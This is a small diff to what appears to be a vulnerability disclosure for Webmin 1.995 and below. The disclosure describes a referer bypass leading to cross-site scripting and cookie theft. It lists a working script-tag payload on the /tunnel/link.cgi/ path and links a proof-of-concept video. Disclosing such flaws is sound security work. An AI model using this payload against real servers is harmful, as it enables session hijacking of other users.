@@ -4,7 +4,7 @@ WebMin 1.995 & Below referers bypass leads to XSS and Stealing Cookies of other 
 
 URL : https://example.com/tunnel/link.cgi/
 
-tested payloads : "https://example.com/tunnel/link.cgi/<script>alert()</script>" [working]
+tested payloads : ```https://example.com/tunnel/link.cgi/<script>alert()</script>``` [Working]
 
 POC VIDEO on YOUTUBE : https://youtu.be/i5MieKoY64Q
  
